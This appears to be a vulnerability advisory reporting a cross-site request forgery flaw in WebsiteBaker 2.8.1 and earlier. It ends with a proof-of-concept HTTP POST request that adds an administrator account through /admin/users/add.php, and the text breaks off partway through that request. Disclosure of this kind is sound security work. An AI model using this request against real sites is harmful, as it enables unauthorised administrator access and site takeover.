1. OVERVIEW

WebsiteBaker 2.8.1 and lower versions are vulnerable to Cross Site Request
Forgery (CSRF).


2. BACKGROUND

WebsiteBaker is a PHP-based Content Management System (CMS) designed with
one goal in mind: to enable its users to produce websites with ease.


3. VULNERABILITY DESCRIPTION

WebsiteBaker 2.8.1 and lower versions contain a flaw that allows a remote
Cross-site Request Forgery (CSRF / XSRF) attack. The flaw exists because the
application does not require multiple steps or explicit confirmation for
sensitive transactions for majority of administrator functions such as
adding new user. By using a crafted URL, an attacker may trick the victim
into visiting to his web page to take advantage of the trust relationship
between the authenticated victim and the application. Such an attack could
trick the victim into executing arbitrary commands in the context of their
session with the application, without further prompting or verification.


4. VERSIONS AFFECTED

2.8.1 <=


5. PROOF-OF-CONCEPT/EXPLOIT

The following request adds an administrator.

[REQUEST]
POST /admin/users/add.php HTTP/1.1
Content-Type: application/x-www-form-urlencoded
Content-Length: 193

user_id=&username_fieldname=username_abcdefg&username_abcdefg=test&password=test&password2=test&display_name=test&email=tester%
